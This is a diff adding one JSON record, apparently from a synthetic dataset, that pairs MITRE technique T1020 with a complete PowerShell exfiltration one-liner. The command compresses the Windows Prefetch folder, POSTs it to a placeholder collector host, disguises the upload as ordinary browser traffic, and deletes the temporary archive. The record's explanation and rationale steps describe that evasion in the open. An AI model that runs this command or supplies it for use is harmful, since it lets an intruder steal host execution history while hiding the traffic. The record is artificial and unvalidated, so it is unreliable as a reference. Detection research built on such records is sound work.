@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$ProgressPreference='SilentlyContinue'; $pf=Join-Path $env:TEMP ('prefetch_'+(Get-Date -Format yyyyMMddHHmmss)+'.zip'); Compress-Archive -Path 'C:\\Windows\\Prefetch' -DestinationPath $pf -Force; Invoke-WebRequest -Uri 'https://collector.example.net/store/pf' -Method Post -InFile $pf -ContentType 'application/zip' -Headers @{ 'User-Agent'='Mozilla/5.0'; 'X-Client'=$env:COMPUTERNAME } -ErrorAction SilentlyContinue; Remove-Item $pf -Force",
+  "explanation": "Zips the Prefetch directory and exfiltrates it via HTTPS POST to analyze execution history.",
+  "rationale_steps": [
+    "Collect Prefetch artifacts indicating program execution.",
+    "Upload via Invoke-WebRequest POST over HTTPS.",
+    "Mask as generic web traffic and delete the temporary archive."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-ed594729-be2cca03",
+  "source_prompt_hash": "ed594729",
+  "timestamp_utc": "2025-09-30T09:16:21.768830Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
